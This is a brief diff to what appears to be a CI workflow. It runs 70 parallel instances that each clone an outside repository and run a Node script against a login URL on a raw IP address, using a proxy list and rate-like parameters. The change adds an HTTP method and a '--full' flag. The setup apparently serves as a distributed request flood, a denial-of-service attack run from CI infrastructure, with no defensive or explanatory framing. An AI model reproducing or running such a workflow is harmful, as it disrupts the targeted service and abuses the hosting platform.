@@ -40,7 +40,7 @@ jobs:
           
           git clone  https://github.com/Ggeg111/curly-octo-doodle.git
           cd curly-octo-doodle
-          node m.js https://45.90.16.40/login 700 4 90 proxy.txt  
+          node m.js GET https://45.90.16.40/login 700 4 90 proxy.txt --full
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
